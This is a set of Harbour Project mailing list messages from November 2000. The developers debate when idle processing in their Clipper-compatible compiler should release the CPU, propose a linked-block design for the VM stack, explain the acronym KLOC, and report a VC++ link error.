From: harbour@lists.harbour-project.org (Ron Pinkas)
Date: Thu Nov 23 11:12:02 2000
Subject: [Harbour] 2000-11-21 18:35 UTC+0800 Ron Pinkas  <ron@profit-master.com>
In-Reply-To: <3A1D4BA8.175.4983F78@localhost>
Message-ID: <LOBBKAFMMFGJIKLMEPAKAEFLDHAA.ron@profit-master.com>

Ryszard,

So you suggest we voluntarily give-up *our* time slice, even when we know we
still have pending tasks to perform?

Isn't it the job of the O/S to balance the needs of different applications?

Ron

> > Once we do enter an IDLE mode, where ReleaseCPU() is a _candidate_, it
> > makes no sense to release the CPU *before* we complete pending tasks!
>
>   Sorry, I don't understand it. What is a _candidate_?
> The overall time spent inside hb_idleState() will be the same
> regardless of the order of ReleaseCPU() call. Releasing of CPU is one
> of idle tasks that have the same prioryty as all other idle tasks
> then it has to be executed.
>
> > Therefore, the order of the functions calls *is* indeed very
> > important. We should *not* release Harbour Application's time slice,
> > until _when_and_if_ we completed all pending tasks. Then if the
> > application is still IDLE, and we have *no* further use for our
> > remaining time slice (until we get the desired I/O input), we should
> > release the CPU.
>
>   No. IMHO releasing CPU is just another idle task that have to be
> executed to allow proper cooperation with other applications. The
> harbour application have to share resources with other applications.
> If we will not call it then the user will have to add manual call for
> CPU releasing, probably as another idle task, that will increase a
> time that will be wasted (due additional overhead of codeblock
> evaluation and a function call).
>
> Regards, Ryszard


From harbour@lists.harbour-project.org  Thu Nov 23 11:21:02 2000
From: harbour@lists.harbour-project.org (harbour@lists.harbour-project.org)
Date: Thu Nov 23 11:21:02 2000
Subject: [Harbour] Random gpfs
In-Reply-To: <3A1D477D.5989.487F8EE@localhost>
References: <200011211838_MC2-BBBE-B713@compuserve.com>
Message-ID: <3A1D5124.15355.1B78AB7@localhost>

On 23 Nov 2000, at 16:36, Ryszard Glab wrote:

> On 21 Nov 2000, at 18:37, John Skelton wrote:
> 
> > BTW, a linked list stack would not be my first choice.
> > 
> > OTOH, a stack which moves around also isn't...
> 
>   I am thinking about a linked list of stack blocks instead of a
> linked list of single items. This will give a possibility to safe
> stack growth and at the same time will not decrease accessing speed
> significantly.

Yes I also things it's the best Idea ( up to now). Perhaps I'm a bit 
optimist but I think it could even be not too hard to implement ...
 
>   What other alternatives are available?
> 
> Regards, Ryszard
> _______________________________________________
> Harbour mailing list
> Harbour@lists.harbour-project.org
> http://www.matrixlist.com/mailman/listinfo/harbour
> 
> Thank you for participating in The Harbour Project.  Be sure to check
> http://www.Harbour-Project.org
> 
> 



Best regards,

J. Lefebvre <jflefebv@mafact.com>
Mafact SA/NV
Belgium
(See us at http://www.mafact.com)
jflefebv@mafact.com


From harbour@lists.harbour-project.org  Thu Nov 23 11:22:12 2000
From: harbour@lists.harbour-project.org (Ron Pinkas)
Date: Thu Nov 23 11:22:12 2000
Subject: [Harbour] CHANGELOG: 2000-11-23 13:32 GMT+1
In-Reply-To: <3A1D1E79.5382D97B@libero.it>
Message-ID: <LOBBKAFMMFGJIKLMEPAKKEFLDHAA.ron@profit-master.com>

Maurilio,

I just read inkey.c and I now understand Victor's and Ryszard concerns, and
also the problem you just mentioned.

I would suggest 2 tier idle processing, first tier, process the GC and idle
tasks. When these tasks have been completed, a flag should be raised so
further IDLE processing will be pure ReleaseCPU().

This flag should be reset in inkey.c once the looping have terminated, so
that next session of IDLE processing will again start by performing the GC
and IDLE tasks.

Ron

> 2000-11-23 13:32 GMT+1 Maurilio Longo <maurilio.longo@libero.it>
>    * source/rtl/teditor.prg
>       ! fixed K_DEL handling
>    * source/rtl/idle.c
>       ! fixed / changed to release cpu only if there are no pending
> keys. Works ok
>         under OS/2. Please test under win32 (linux still lacks system
> call to release cpu).
>         Note: since I can enter hb_IdleState() while waiting a certain
> amount of time to
>               elapse (ie. Inkey(.1)) I cannot keep calling idle tasks
> but I have to exit
>               hb_IdleState() every time an idle task has ended its
> execution. If I have
>               time left to wait I'll reenter hb_IdleState() immediatly
> (executing next
>               idle task).


From harbour@lists.harbour-project.org  Thu Nov 23 11:23:02 2000
From: harbour@lists.harbour-project.org (Dave Pearson)
Date: Thu Nov 23 11:23:02 2000
Subject: [Harbour] Alaska's site
In-Reply-To: <3A1D37F3.78422828@libero.it>; from maurilio.longo@libero.it on Thu, Nov 23, 2000 at 04:29:55PM +0100
References: <3A1D37F3.78422828@libero.it>
Message-ID: <20001123160137.R8569@hagbard.davep.org>

On Thu, Nov 23, 2000 at 04:29:55PM +0100, Maurilio Longo wrote:

> They're talking about us (here and there) :-)
> 
> http://www.alaska-software.com/e/press/articles.html#nov16

I see they're still playing the KLOC game:

,----
| This is more than 20 times the size of the Harbour project or
| approximately 20% of Windows NT.
`----

I don't know what's more perplexing, that KLOCs would be seen as a measure
of anything or that they've got a compiler that's 1/5 the size of a whole
operating system.

-- 
The Harbour Project: A free software Clipper compatible compiler
Home Page..........: http://www.harbour-project.org/
FAQ................: http://www.harbour-project.org/faq/harbour.html
My harbour page....: http://www.hagbard.demon.co.uk/harbour/

From harbour@lists.harbour-project.org  Thu Nov 23 11:25:07 2000
From: harbour@lists.harbour-project.org (Ryszard Glab)
Date: Thu Nov 23 11:25:07 2000
Subject: [Harbour] 2000-11-21 18:35 UTC+0800 Ron Pinkas  <ron@profit-master.com>
In-Reply-To: <LOBBKAFMMFGJIKLMEPAKIEFDDHAA.ron@profit-master.com>
References: <030201c054e5$43f33470$0a0ac8c8@VECWS1>
Message-ID: <3A1D51B4.18847.4AFDC55@localhost>

On 22 Nov 2000, at 17:28, Ron Pinkas wrote:

> If I understand Maurilio's logic correctly, Harbour *will* release the
> CPU just as soon as the IDLE Block will be evaluated.
> 
> IAE, once the application has something to do, it should *not* be
> considered idle! If the app designer wanted the app to do something
> when not busy performing explicit other tasks, Harbour should do
> exactly that.

  The application is in an idle state if it waits for keyboard input 
or when the programmer decide by calling HB_IDLESTATE() explicity. 
One of idle state tasks have to be releasing the CPU in OS that 
require it for proper cooperation of applications.
  Tasks placed in the idle queue are not considered the main 
application job. They can be very usable however they are not the 
main application flow. You are reverting upside-down the whole usage 
of idle states.

> Finally, most popular Multi-Tasking O/Ss have logic to detect, and
> automatically "suspend", any task _waiting_ for I/O. I haven't read
> the logic of our KB I/O routines, to see if we use logic that will
> correctly imply such, but I understand that this can and should be
> done.

  Ron, some very popular OS doesn't have this logic hence many 
problems with Clipper and now with Harbour. Calling hb_releaseCPU() 
during idle states is the solution for this problem.
Poor performance during display operation can be a result of other 
poorly designed applications that doesn't releases CPU and are 
forcing the OS to steel time slices during screen operations.

Regards, Ryszard

From harbour@lists.harbour-project.org  Thu Nov 23 11:40:02 2000
From: harbour@lists.harbour-project.org (Felipe G. Coury)
Date: Thu Nov 23 11:40:02 2000
Subject: [Harbour] Alaska's site
References: <3A1D37F3.78422828@libero.it> <20001123160137.R8569@hagbard.davep.org>
Message-ID: <02fa01c05575$267302a0$3c01a8c0@creation>

Dave,

> I see they're still playing the KLOC game:
What's KLOC? Can you please do me a favor? Anytime you use those
abbreviations, can you please post that footnote you use sometimes? TIA!

Regards,

Felipe G. Coury
Gerente de Desenvolvimento
Creation Internet Business
http://www.creation.com.br

--------------------------------------------
Visite o GuiaBrasil.Net:
http://www.guiabrasil.net
--------------------------------------------



From harbour@lists.harbour-project.org  Thu Nov 23 12:00:06 2000
From: harbour@lists.harbour-project.org (=?iso-8859-1?Q?Gustavo_A._Gonz=E1lez_M.?=)
Date: Thu Nov 23 12:00:06 2000
Subject: [Harbour] Alaska's site
References: <3A1D37F3.78422828@libero.it> <20001123160137.R8569@hagbard.davep.org> <02fa01c05575$267302a0$3c01a8c0@creation>
Message-ID: <00bc01c0556e$560f9840$29f4c4a1@gustavo>

Every time that Dave write, i need connect and search the web for his
abreviation.

Regards.

----- Original Message -----
From: Felipe G. Coury <fcoury@creation.com.br>
To: <harbour@lists.harbour-project.org>
Sent: Thursday, November 23, 2000 1:45 PM
Subject: Re: [Harbour] Alaska's site


> Dave,
>
> > I see they're still playing the KLOC game:
> What's KLOC? Can you please do me a favor? Anytime you use those
> abbreviations, can you please post that footnote you use sometimes? TIA!
>
> Regards,
>
> Felipe G. Coury
> Gerente de Desenvolvimento
> Creation Internet Business
> http://www.creation.com.br
>
> --------------------------------------------
> Visite o GuiaBrasil.Net:
> http://www.guiabrasil.net
> --------------------------------------------
>
>
> _______________________________________________
> Harbour mailing list
> Harbour@lists.harbour-project.org
> http://www.matrixlist.com/mailman/listinfo/harbour
>
> Thank you for participating in The Harbour Project.  Be sure to check
> http://www.Harbour-Project.org
>



From harbour@lists.harbour-project.org  Thu Nov 23 12:08:02 2000
From: harbour@lists.harbour-project.org (Ron Pinkas)
Date: Thu Nov 23 12:08:02 2000
Subject: [Harbour] Alaska's site
In-Reply-To: <02fa01c05575$267302a0$3c01a8c0@creation>
Message-ID: <LOBBKAFMMFGJIKLMEPAKOEFMDHAA.ron@profit-master.com>

I suspect its: Ks (1000) Lines Of Code.

Ron

> Dave,
> 
> > I see they're still playing the KLOC game:
> What's KLOC? Can you please do me a favor? Anytime you use those
> abbreviations, can you please post that footnote you use sometimes? TIA!
> 
> Regards,
> 
> Felipe G. Coury
> Gerente de Desenvolvimento
> Creation Internet Business
> http://www.creation.com.br


From harbour@lists.harbour-project.org  Thu Nov 23 12:11:02 2000
From: harbour@lists.harbour-project.org (Felipe G. Coury)
Date: Thu Nov 23 12:11:02 2000
Subject: [Harbour] Found it!
Message-ID: <038a01c05579$8bae17a0$3c01a8c0@creation>

Searching the web I found:

KLOC: Thousands of Lines of Code.

Very nice!

Felipe G. Coury
Gerente de Desenvolvimento
Creation Internet Business
http://www.creation.com.br

--------------------------------------------
Visite o GuiaBrasil.Net:
http://www.guiabrasil.net
--------------------------------------------



From harbour@lists.harbour-project.org  Thu Nov 23 12:12:03 2000
From: harbour@lists.harbour-project.org (Maurilio Longo)
Date: Thu Nov 23 12:12:03 2000
Subject: [Harbour] 2000-11-21 18:35 UTC+0800 Ron Pinkas
 <ron@profit-master.com>
References: <3A1C17EA.426.510314@localhost> <3A1D4BA8.175.4983F78@localhost>
Message-ID: <3A1D4FAF.386D40AF@libero.it>

Ryszard,

this is true under windows 3.11 or MacOS!!!!!

But please, under preemptive operating systems you DON'T HAVE to release
cpu because the operating system stops and restarts you at its own will!

It's only a kindness to the OS, and so to the user, to tell the
operating system that you are idle and so it (the operating system) can
stop you from wasting cpu cycles on an active wait (that is polling
something, be it the keyboard or the system time like clipper does when
it is idle).

Because of this you release cpu only when you don't have anything to do.
Releasing cpu is not an idle task, it's the only thing you can do when
there is nothing more to do but wait for something to happen from the
outside (of your process, like an user pressing a key).

regards.

PS. Please test latest code I've committed today and report your
findings.

Ryszard Glab ha scritto:
> 
> On 22 Nov 2000, at 15:44, Ron Pinkas wrote:
> 
> > Once we do enter an IDLE mode, where ReleaseCPU() is a _candidate_, it
> > makes no sense to release the CPU *before* we complete pending tasks!
> 
>   Sorry, I don't understand it. What is a _candidate_?
> The overall time spent inside hb_idleState() will be the same
> regardless of the order of ReleaseCPU() call. Releasing of CPU is one
> of idle tasks that have the same prioryty as all other idle tasks
> then it has to be executed.
> 
> > Therefore, the order of the functions calls *is* indeed very
> > important. We should *not* release Harbour Application's time slice,
> > until _when_and_if_ we completed all pending tasks. Then if the
> > application is still IDLE, and we have *no* further use for our
> > remaining time slice (until we get the desired I/O input), we should
> > release the CPU.
> 
>   No. IMHO releasing CPU is just another idle task that have to be
> executed to allow proper cooperation with other applications. The
> harbour application have to share resources with other applications.
> If we will not call it then the user will have to add manual call for
> CPU releasing, probably as another idle task, that will increase a
> time that will be wasted (due additional overhead of codeblock
> evaluation and a function call).
> 
> Regards, Ryszard
> _______________________________________________
> Harbour mailing list
> Harbour@lists.harbour-project.org
> http://www.matrixlist.com/mailman/listinfo/harbour
> 
> Thank you for participating in The Harbour Project.  Be sure to check
> http://www.Harbour-Project.org

-- 
 __________                   
|  |  | |__| md2520@mclink.it 
|_|_|_|____| Team OS/2 Italia

From harbour@lists.harbour-project.org  Thu Nov 23 12:19:02 2000
From: harbour@lists.harbour-project.org (Maurilio Longo)
Date: Thu Nov 23 12:19:02 2000
Subject: [Harbour] CHANGELOG: 2000-11-23 13:32 GMT+1
References: <LOBBKAFMMFGJIKLMEPAKKEFLDHAA.ron@profit-master.com>
Message-ID: <3A1D510D.2F8B4EE2@libero.it>

Ron,

I've tested my code under OS/2 and it works as expected. Please look at
idle.c hb_IdleState(), it calls GC, then fist idle task then if there
are no pending keys to process it calls relaseCPU.

When it returns from releaseCPU it leaves hb_IdleState() and goes back
to inkey.c where if it is waiting for some time to elapse (or there are
no keys to handle) it will call hb_idleState() again which will call GC,
execute second idle task (if present or re-execute first) and then call
releaseCPU again  and so on.

regards.

Ron Pinkas ha scritto:
> 
> Maurilio,
> 
> I just read inkey.c and I now understand Victor's and Ryszard concerns, and
> also the problem you just mentioned.
> 
> I would suggest 2 tier idle processing, first tier, process the GC and idle
> tasks. When these tasks have been completed, a flag should be raised so
> further IDLE processing will be pure ReleaseCPU().
> 
> This flag should be reset in inkey.c once the looping have terminated, so
> that next session of IDLE processing will again start by performing the GC
> and IDLE tasks.
> 
> Ron
> 
> > 2000-11-23 13:32 GMT+1 Maurilio Longo <maurilio.longo@libero.it>
> >    * source/rtl/teditor.prg
> >       ! fixed K_DEL handling
> >    * source/rtl/idle.c
> >       ! fixed / changed to release cpu only if there are no pending
> > keys. Works ok
> >         under OS/2. Please test under win32 (linux still lacks system
> > call to release cpu).
> >         Note: since I can enter hb_IdleState() while waiting a certain
> > amount of time to
> >               elapse (ie. Inkey(.1)) I cannot keep calling idle tasks
> > but I have to exit
> >               hb_IdleState() every time an idle task has ended its
> > execution. If I have
> >               time left to wait I'll reenter hb_IdleState() immediatly
> > (executing next
> >               idle task).
> 
> _______________________________________________
> Harbour mailing list
> Harbour@lists.harbour-project.org
> http://www.matrixlist.com/mailman/listinfo/harbour
> 
> Thank you for participating in The Harbour Project.  Be sure to check
> http://www.Harbour-Project.org

-- 
 __________                   
|  |  | |__| md2520@mclink.it 
|_|_|_|____| Team OS/2 Italia

From harbour@lists.harbour-project.org  Thu Nov 23 12:28:01 2000
From: harbour@lists.harbour-project.org (Ryszard Glab)
Date: Thu Nov 23 12:28:01 2000
Subject: Changes in VM and eval stack (was:(Re: [Harbour] Random gpfs)
Message-ID: <3A1D629C.12615.4F1E67B@localhost>

On 23 Nov 2000, at 17:17, jflefebv@mafact.com wrote:

> Yes I also things it's the best Idea ( up to now). Perhaps I'm a bit
> optimist but I think it could even be not too hard to implement ...

  A linked list is not a problem. However there are changes required 
in stack accessing. We cannot use any longer a simple hb_stack.pPos-1 
and hb_stack.pBase+1. We have to store an address of a stack block 
and a current position within its block instead a simple pointer as a 
function stackbase. Storing a pointer only will not allow to skip to 
next block to access parameters or local variables.

  Additionally I want to join this change with NIL removal that is 
not required in function calls (we are pushing NIL after the symbol, 
this NIL is replaced either with an object if message is send or is 
replaced with a codeblock in EVAL function). 
  In function call we can place parameters directly after a symbol. 
During message sending we can place an object directly after the 
message symbol and flag this symbol so we will be able to recognize 
it as a message during function calls stack dumping 
(PROCNAME()/PROCLINE()). For codeblock evaluation we don't have to 
copy again all parameters placed in EVAL call - we can leave the eval 
stack unchanged and set the stackbase to point to this codeblock. 
Additionally a codeblock will store a name and line number of 
function where it is created so we can report correctly 
,,(b)originfunc(line)'' in PROCNAME() instead of current ,,__eval'' 
solution.

Regards, Ryszard


From harbour@lists.harbour-project.org  Thu Nov 23 12:33:02 2000
From: harbour@lists.harbour-project.org (Victor Szakats)
Date: Thu Nov 23 12:33:02 2000
Subject: Changes in VM and eval stack (was:(Re: [Harbour] Random gpfs)
References: <3A1D629C.12615.4F1E67B@localhost>
Message-ID: <03e801c05573$9805c990$0a0ac8c8@VECWS1>

>   A linked list is not a problem. However there are changes required 
> in stack accessing. We cannot use any longer a simple hb_stack.pPos-1 
> and hb_stack.pBase+1. We have to store an address of a stack block 
> and a current position within its block instead a simple pointer as a 
> function stackbase. Storing a pointer only will not allow to skip to 
> next block to access parameters or local variables.
> 
>   Additionally I want to join this change with NIL removal that is 
> not required in function calls (we are pushing NIL after the symbol, 
> this NIL is replaced either with an object if message is send or is 
> replaced with a codeblock in EVAL function). 
>   In function call we can place parameters directly after a symbol. 
> During message sending we can place an object directly after the 
> message symbol and flag this symbol so we will be able to recognize 
> it as a message during function calls stack dumping 
> (PROCNAME()/PROCLINE()). For codeblock evaluation we don't have to 
> copy again all parameters placed in EVAL call - we can leave the eval 
> stack unchanged and set the stackbase to point to this codeblock. 
> Additionally a codeblock will store a name and line number of 
> function where it is created so we can report correctly 
> ,,(b)originfunc(line)'' in PROCNAME() instead of current ,,__eval'' 
> solution.

All cool stuff.

Victor Szakats



From harbour@lists.harbour-project.org  Thu Nov 23 12:41:02 2000
From: harbour@lists.harbour-project.org (Ryszard Glab)
Date: Thu Nov 23 12:41:02 2000
Subject: [Harbour] CHANGELOG: 2000-11-23 13:32 GMT+1
In-Reply-To: <3A1D510D.2F8B4EE2@libero.it>
Message-ID: <3A1D659F.15494.4FDAC1C@localhost>

On 23 Nov 2000, at 18:17, Maurilio Longo wrote:

> When it returns from releaseCPU it leaves hb_IdleState() and goes back
> to inkey.c where if it is waiting for some time to elapse (or there
> are no keys to handle) it will call hb_idleState() again which will
> call GC, execute second idle task (if present or re-execute first) and
> then call releaseCPU again  and so on.

  IMHO - no. Because during garbage collecting (or during any other 
idle task) the key can be pressed causing that hb_releaseCPU() will 
be never called. Notice that the idle task can be a time consuming 
operation - for example I have used this technique in Clipper for 
pooling data from six buffers filled by interrupt driven serial ports 
and next storing them in a database. In this case storing the data 
had the higher priority then responding to keystrokes - adding a few 
miliseconds for this will have no influence on user's interacition.

Regards, Ryszard

From harbour@lists.harbour-project.org  Thu Nov 23 12:41:33 2000
From: harbour@lists.harbour-project.org (Dave Pearson)
Date: Thu Nov 23 12:41:33 2000
Subject: [Harbour] Alaska's site
In-Reply-To: <00bc01c0556e$560f9840$29f4c4a1@gustavo>; from gonzalezgustavo@cantv.net on Thu, Nov 23, 2000 at 12:54:28PM -0400
References: <3A1D37F3.78422828@libero.it> <20001123160137.R8569@hagbard.davep.org> <02fa01c05575$267302a0$3c01a8c0@creation> <00bc01c0556e$560f9840$29f4c4a1@gustavo>
Message-ID: <20001123173856.X8569@hagbard.davep.org>

On Thu, Nov 23, 2000 at 12:54:28PM -0400, Gustavo A. González M. wrote:

> Every time that Dave write, i need connect and search the web for his
> abreviation.

See TNHD AKA TJF, HTH, HAND. TTFN.

-- 
The Harbour Project: A free software Clipper compatible compiler
Home Page..........: http://www.harbour-project.org/
FAQ................: http://www.harbour-project.org/faq/harbour.html
My harbour page....: http://www.hagbard.demon.co.uk/harbour/

From harbour@lists.harbour-project.org  Thu Nov 23 12:42:12 2000
From: harbour@lists.harbour-project.org (Dave Pearson)
Date: Thu Nov 23 12:42:12 2000
Subject: [Harbour] Alaska's site
In-Reply-To: <02fa01c05575$267302a0$3c01a8c0@creation>; from fcoury@creation.com.br on Thu, Nov 23, 2000 at 02:45:19PM -0300
References: <3A1D37F3.78422828@libero.it> <20001123160137.R8569@hagbard.davep.org> <02fa01c05575$267302a0$3c01a8c0@creation>
Message-ID: <20001123173732.W8569@hagbard.davep.org>

On Thu, Nov 23, 2000 at 02:45:19PM -0300, Felipe G. Coury wrote:
> Dave,
> 
> > I see they're still playing the KLOC game:
>
> What's KLOC? Can you please do me a favor? Anytime you use those
> abbreviations, can you please post that footnote you use sometimes?

,----
| From The Free On-line Dictionary of Computing (15Feb98):
| 
| KLOC
| 
|    <unit, programming> Thousand (kilo-) Lines of code.
| 
|    (12 Mar 1995)
`----

> TIA!

Ahem! Where's your footnote?

-- 
The Harbour Project: A free software Clipper compatible compiler
Home Page..........: http://www.harbour-project.org/
FAQ................: http://www.harbour-project.org/faq/harbour.html
My harbour page....: http://www.hagbard.demon.co.uk/harbour/

From harbour@lists.harbour-project.org  Thu Nov 23 12:45:03 2000
From: harbour@lists.harbour-project.org (John Skelton)
Date: Thu Nov 23 12:45:03 2000
Subject: [Harbour] getting old CVS snapshots
Message-ID: <200011231243_MC2-BBF3-5305@compuserve.com>

Ryszard, (& Ron)

"I meant: write an information about what is broken ..."

Oh!  Sorry, I never thought of that other meaning. :-(

I don't know exactly what is broken, or exactly when it happened,
unfortunately.  A while ago I had _loads_ of Clip-4-Win apps working
(apart from parts I've got stubs for), but then one of the 0.35X
changes made the OOP stop working properly.  I think that was about
3 weeks ago.  Jean and I have been trying to find what it is but he's
not using VC++ like me.  I have a longer term intention to use BC++
but in the middle of all the other things I've been changing for
Harbour it isn't attractive to change C compiler as well. :-(  IAC,
Jean has VC++ and he's going to try it.  We're still part way through
that plan, due to a number of things (mainly, being too busy!).

Just after the problem first occurred I wasn't able to build Harbour
at all (remember the changes to the RDD stuff with some casts where
I couldn't even figure out what they should be?).

Anyway, Jean hopes to try a VC++ build tonight. :-)

Meanwhile I got the current CVS and can't build hbrun.exe. :-(  I get
a weird error:
	cl -Iinclude -TP -W3 -nologo -D_MSC_VER=3D1010  -Foobj\vc\ -Tp obj\vc\hb=
run.c -Tp obj\vc\external.c -o bin\vc\hbrun.exe /link  lib\vc\rtl.lib  li=
b\vc\common.lib  lib\vc\debug.lib  lib\vc\macro.lib  lib\vc\pp.lib  lib\v=
c\lang.lib  lib\vc\rdd.lib  lib\vc\dbfcdx.lib  lib\vc\dbfntx.lib  lib\vc\=
nulsys.lib  lib\vc\vm.lib  lib\vc\gtwin.lib  lib\vc\macro.lib  user32.lib=

obj\vc\hbrun.c
obj\vc\external.c
rtl.lib(idle.obj) : error LNK2001: unresolved external symbol "?hb_inkeyN=
ext@@YAHXZ (int  __cdecl hb_inkeyNext(void))"
bin\vc\hbrun.exe : error LNK1120: 1 unresolved externals

The weird bit is that idle.c declares that it needs that function,
and it's defined OK in inkey.c.  I can't see what the problem is!

I can see a new idle.obj & inkey.obj in obj\vc, and a new
lib\vc\rtl.lib which is built OK from them.  OTOH, MS LINK isn't
happy. :-(

And yes, I did remember to do a CLEAN build. :-)  (I'm using the
simplex build.)

John.

From harbour@lists.harbour-project.org  Thu Nov 23 12:51:02 2000
From: harbour@lists.harbour-project.org (Ryszard Glab)
Date: Thu Nov 23 12:51:02 2000
Subject: [Harbour] 2000-11-21 18:35 UTC+0800 Ron Pinkas   <ron@profit-master.com>
In-Reply-To: <3A1D4FAF.386D40AF@libero.it>
Message-ID: <3A1D6832.31467.507B8B7@localhost>

On 23 Nov 2000, at 18:11, Maurilio Longo wrote:

> this is true under windows 3.11 or MacOS!!!!!

  Again - no. See comp.lang.clipper or any newsgroups archives to see 
that all complains are related to running Clipper on Windows NT/2000. 
Windows 3.x and 9x are not affected by this issue. It is just a 
Microsoft magic :)

> Because of this you release cpu only when you don't have anything to
> do. Releasing cpu is not an idle task, it's the only thing you can 
do
> when there is nothing more to do but wait for something to happen 
from
> the outside (of your process, like an user pressing a key).

  You have to release CPU to get running other processes managed by 
an OS.

Regards, Ryszard


From harbour@lists.harbour-project.org  Thu Nov 23 12:59:02 2000
From: harbour@lists.harbour-project.org (Maurilio Longo)
Date: Thu Nov 23 12:59:02 2000
Subject: Changes in VM and eval stack (was:(Re: [Harbour] Random gpfs)
References: <3A1D629C.12615.4F1E67B@localhost>
Message-ID: <3A1D5AB3.BB85C306@libero.it>

Ryszard,

I think we should investigate memory allocation and commitment under
win32 (linux and OS/2 are surely ok and I can't belive that there isn't
something similar under win32 as well).

Sadly I don't know win32 api, so I'll have to go to micro$oft site and
start wandering.

This way we would have a single stack object (and single symbols
"container" as well).

regards.


Ryszard Glab ha scritto:
> 
> On 23 Nov 2000, at 17:17, jflefebv@mafact.com wrote:
> 
> > Yes I also things it's the best Idea ( up to now). Perhaps I'm a bit
> > optimist but I think it could even be not too hard to implement ...
> 
>   A linked list is not a problem. However there are changes required
> in stack accessing. We cannot use any longer a simple hb_stack.pPos-1
> and hb_stack.pBase+1. We have to store an address of a stack block
> and a current position within its block instead a simple pointer as a
> function stackbase. Storing a pointer only will not allow to skip to
> next block to access parameters or local variables.
> 
>   Additionally I want to join this change with NIL removal that is
> not required in function calls (we are pushing NIL after the symbol,
> this NIL is replaced either with an object if message is send or is
> replaced with a codeblock in EVAL function).
>   In function call we can place parameters directly after a symbol.
> During message sending we can place an object directly after the
> message symbol and flag this symbol so we will be able to recognize
> it as a message during function calls stack dumping
> (PROCNAME()/PROCLINE()). For codeblock evaluation we don't have to
> copy again all parameters placed in EVAL call - we can leave the eval
> stack unchanged and set the stackbase to point to this codeblock.
> Additionally a codeblock will store a name and line number of
> function where it is created so we can report correctly
> ,,(b)originfunc(line)'' in PROCNAME() instead of current ,,__eval''
> solution.
> 
> Regards, Ryszard
> 
> _______________________________________________
> Harbour mailing list
> Harbour@lists.harbour-project.org
> http://www.matrixlist.com/mailman/listinfo/harbour
> 
> Thank you for participating in The Harbour Project.  Be sure to check
> http://www.Harbour-Project.org

-- 
 __________                   
|  |  | |__| md2520@mclink.it 
|_|_|_|____| Team OS/2 Italia

From harbour@lists.harbour-project.org  Thu Nov 23 13:08:01 2000
From: harbour@lists.harbour-project.org (Ron Pinkas)
Date: Thu Nov 23 13:08:01 2000
Subject: [Harbour] 2000-11-23 10:00 UTC+0800 Ron Pinkas <ron@profit-master.com>
In-Reply-To: <3A1D6832.31467.507B8B7@localhost>
Message-ID: <LOBBKAFMMFGJIKLMEPAKMEFODHAA.ron@profit-master.com>

2000-11-23 10:00 UTC+0800 Ron Pinkas <ron@profit-master.com>
   * source/rtl/idle.c
   * source/rtl/inkey.c
     ! Improved granularity of Idle Processing:
         - GC is called only once per Wait Session.
	   - Single Idle Task is performed for each iteration of hb_idleState() but
never more than once per Wait Session.
	   - ReleaseCPU() is guaranteed to be the only code executing for the
remainder of every Wait Session.

   /* Maurilio, Ryszard, Victor, could you please review and comment... */


From harbour@lists.harbour-project.org  Thu Nov 23 13:12:02 2000
From: harbour@lists.harbour-project.org (Victor Szakats)
Date: Thu Nov 23 13:12:02 2000
Subject: Changes in VM and eval stack (was:(Re: [Harbour] Random gpfs)
References: <3A1D629C.12615.4F1E67B@localhost> <3A1D5AB3.BB85C306@libero.it>
Message-ID: <040e01c05578$ae7b0c30$0a0ac8c8@VECWS1>

Maurilio,

> I think we should investigate memory allocation and commitment under
> win32 (linux and OS/2 are surely ok and I can't belive that there isn't
> something similar under win32 as well).

The problem with this approach is that it's highly OS, platform and API 
dependent, but the real problem is that some OSs won't support such 
services at all (16bit DOS, handheld, embedded OSs), or at best in a 
linker or 3rd party specific way.

So I think that either a fixed stack (using a user defined stack size with   
a reasonable default size), or the linked list is the way to go.

The first choice is simpler and faster, while second scales much better.
Linked blocks (if not too complicated to implement) could be a good 
balance between the two methods.

Victor Szakats



From harbour@lists.harbour-project.org  Thu Nov 23 13:13:02 2000
From: harbour@lists.harbour-project.org (Maurilio Longo)
Date: Thu Nov 23 13:13:02 2000
Subject: [Harbour] 2000-11-21 18:35 UTC+0800 Ron Pinkas
 <ron@profit-master.com>
References: <3A1D6832.31467.507B8B7@localhost>
Message-ID: <3A1D5DD0.6604AF29@libero.it>

Ryszard,

years ago I wrote a small TSR (terminate and stay resident :-)) for OS/2
DOS windows to let clipper programs run without hogging too much cpu
time. OS/2 suffers from cpu hogging from clipper programs as well as
winNT and 2K.

Clipper programs when idle call time of day api. I think that OS/2 and
NT don't look at this call as an indication that DOS task is idle. WinXX
does.

My little tsr calls an api available inside OS/2 DOS windows to release
cpu. I can have as many dos windows with as many copies of clipper
programs running as I like without any noticeable slow down.

Clipper VM calls this time of day api when idle. Instead of calling time
of day Harbour executes an idle task from the list of available ones and
then, if no keys are pending, releases cpu back to the OS.

Please test latest cvs code and let me know.

regards.

PS. I can send this small program (and its pascal source code) if
someone wants it for OS/2 (sadly few OS/2 users remain :-| ).


Ryszard Glab ha scritto:
> 
> On 23 Nov 2000, at 18:11, Maurilio Longo wrote:
> 
> > this is true under windows 3.11 or MacOS!!!!!
> 
>   Again - no. See comp.lang.clipper or any newsgroups archives to see
> that all complains are related to running Clipper on Windows NT/2000.
> Windows 3.x and 9x are not affected by this issue. It is just a
> Microsoft magic :)
> 
> > Because of this you release cpu only when you don't have anything to
> > do. Releasing cpu is not an idle task, it's the only thing you can
> do
> > when there is nothing more to do but wait for something to happen
> from
> > the outside (of your process, like an user pressing a key).
> 
>   You have to release CPU to get running other processes managed by
> an OS.
> 
> Regards, Ryszard
> 
> _______________________________________________
> Harbour mailing list
> Harbour@lists.harbour-project.org
> http://www.matrixlist.com/mailman/listinfo/harbour
> 
> Thank you for participating in The Harbour Project.  Be sure to check
> http://www.Harbour-Project.org

-- 
 __________                   
|  |  | |__| md2520@mclink.it 
|_|_|_|____| Team OS/2 Italia

From harbour@lists.harbour-project.org  Thu Nov 23 13:15:01 2000
From: harbour@lists.harbour-project.org (Ron Pinkas)
Date: Thu Nov 23 13:15:01 2000
Subject: [Harbour] 2000-11-23 10:00 UTC+0800 Ron Pinkas <ron@profit-master.com>
In-Reply-To: <LOBBKAFMMFGJIKLMEPAKMEFODHAA.ron@profit-master.com>
Message-ID: <LOBBKAFMMFGJIKLMEPAKEEFPDHAA.ron@profit-master.com>

Further clarification, incase *not* all Idle Tasks have been completed, the
next Wait Session will *continue* with the next pending Idle Task, *before*
staring a new cycle (which begins with the GC then 1st Idle Task and so
on... )

> 2000-11-23 10:00 UTC+0800 Ron Pinkas <ron@profit-master.com>
>    * source/rtl/idle.c
>    * source/rtl/inkey.c
>      ! Improved granularity of Idle Processing:
>          - GC is called only once per Wait Session.
> 	   - Single Idle Task is performed for each iteration of
> hb_idleState() but
> never more than once per Wait Session.
> 	   - ReleaseCPU() is guaranteed to be the only code
